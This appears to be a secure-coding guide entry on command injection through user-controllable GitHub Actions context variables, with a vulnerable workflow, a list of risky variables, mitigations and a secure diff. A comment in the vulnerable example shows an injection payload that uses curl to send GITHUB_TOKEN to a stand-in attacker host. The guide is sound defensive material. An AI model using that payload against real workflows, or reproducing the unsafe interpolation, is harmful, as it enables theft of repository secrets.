# Risky Context Usage

## Description

Workflows that use user-controllable GitHub context variables (such as `github.event.issue.body`, `github.event.pull_request.title`, `github.ref_name`, etc.) create injection attack vectors: these context variables contain user-provided data that can be manipulated by attackers to inject malicious code, execute arbitrary commands, or access sensitive information. Many GitHub context variables ending in `.body`, `.title`, `.message`, `.name`, `.ref`, `.head_ref`, `.default_branch`, or `.email` are user-controllable and should be treated as untrusted input. [^gh_actions_security]

> **Self-hosted runners:** When these risky context variables are executed on self-hosted runners, treat the finding as critical. Self-hosted infrastructure executes arbitrary user input with full network access, so the same risky context usage introduces a much higher impact than on GitHub-hosted runners.

## Vulnerable Instance

- Workflow uses GitHub context variables that contain user-controllable data.
- Context variables are used in shell commands, environment variables, or action parameters without validation.
- Attacker can manipulate these values to inject malicious code or commands.

```yaml
name: Process Pull Request
on:
  pull_request:
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR Title
        run: echo ${{ github.event.pull_request.title }}
        # Attacker can inject: "; curl attacker.com/steal?token=$GITHUB_TOKEN; #"
      - name: Process PR Body
        run: |
          echo ${{ github.event.pull_request.body }}
          # Attacker can inject malicious commands in PR description
```

### Risky Context Variables

The following GitHub context variables are considered risky and user-controllable:

- `github.event.issue.title` / `github.event.issue.body`
- `github.event.issue_comment.body` / `github.event.comment.body`
- `github.event.pull_request.title` / `github.event.pull_request.body`
- `github.event.pull_request.head_ref` / `github.event.pull_request.base_ref`
- `github.event.release.name` / `github.event.release.tag_name`
- `github.event.discussion.body`
- `github.event.ref`
- `github.ref_name`
- `github.event.repository.default_branch`
- `github.event.label.name`
- `github.event.sender.email`
- `github.event.page_name`
- Any context ending in `.body`, `.title`, `.message`, `.name`, `.ref`, `.head_ref`, `.default_branch`, or `.email`

## Mitigation Strategies

1. **Use environment variables instead of direct interpolation**  
   **Never use `${{ github.event.* }}` directly in shell commands.** This is the most critical security practice. Always assign risky context variables to environment variables first, then reference them safely within your scripts. This approach mitigates the risk of unintended command execution. [^gh_blog_security]

   ```yaml
   - name: Set PR title
     env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "$PR_TITLE"
   ```

2. **Validate and sanitize all user-controllable context**  
   Validate context variables against allowlists, check for required patterns, and reject values that don't match expected formats. Never trust user-controllable context without validation. [^gh_actions_security]

   ```yaml
   - name: Process PR safely
     env:
       PR_TITLE: ${{ github.event.pull_request.title }}
       PR_BODY: ${{ github.event.pull_request.body }}
     run: |
       # Validate inputs
       if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s.,!?-]+$ ]]; then
         echo "Invalid PR title"
         exit 1
       fi
       if [[ ! "$PR_BODY" =~ ^[a-zA-Z0-9\s.,!?\n-]+$ ]]; then
         echo "Invalid PR body"
         exit 1
       fi
       echo "Processing: $PR_TITLE"
       echo "Description: $PR_BODY"
   ```

3. **Avoid direct interpolation in commands**  
   Never use `${{ github.event.* }}` directly in shell commands. This creates immediate command injection vulnerabilities. Always use environment variables as an intermediate step.

4. **Use parameterized commands**  
   Use parameterized commands and prepared statements instead of string interpolation. This prevents injection attacks by separating data from code.

5. **Restrict workflow triggers**  
   Limit which events can trigger workflows. Avoid workflows triggered by user-controllable events (issues, pull requests, discussions) when processing sensitive operations.

6. **Use minimal permissions**  
   Workflows that process user input should use minimal permissions. Never grant write permissions to workflows that process untrusted input.

7. **Review context usage**  
   Audit all workflows for risky context usage. Ensure all user-controllable context is validated before use in commands, file paths, or action parameters.

### Secure Version

```diff
 name: Process Pull Request Safely
 on:
   pull_request:
 jobs:
   process:
     runs-on: ubuntu-latest
     steps:
       - name: Process PR Title
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
         run: |
+          # Validate and sanitize inputs
+          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s.,!?-]+$ ]]; then
+            echo "Invalid PR title"
+            exit 1
+          fi
+          if [[ ! "$PR_BODY" =~ ^[a-zA-Z0-9\s.,!?\n-]+$ ]]; then
+            echo "Invalid PR body"
+            exit 1
+          fi
+          # Use validated inputs safely
-          echo ${{ github.event.pull_request.title }}
-          echo ${{ github.event.pull_request.body }}
+          echo "Processing PR: $PR_TITLE"
+          echo "PR Description: $PR_BODY"
```

## Impact

| Dimension | Severity | Notes |
| --- | --- | --- |
| Likelihood | ![High](https://img.shields.io/badge/-High-orange?style=flat-square) | Risky context usage is common in workflows that process user input from issues, pull requests, or discussions. |
| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | User-controllable context can be exploited to inject malicious code, execute arbitrary commands, or access sensitive information with workflow permissions. |
| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised workflows can affect all systems the workflow can access, including repositories, secrets, deployment targets, and internal networks. |

## References

- GitHub Blog, "Four tips to keep your GitHub Actions workflows secure," https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/ [^gh_blog_security]
- GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [^gh_actions_security]
- GitHub Docs, "Contexts," https://docs.github.com/en/actions/learn-github-actions/contexts [^gh_contexts]

---

[^gh_blog_security]: GitHub Blog, "Four tips to keep your GitHub Actions workflows secure," https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/
[^gh_actions_security]: GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
[^gh_contexts]: GitHub Docs, "Contexts," https://docs.github.com/en/actions/learn-github-actions/contexts

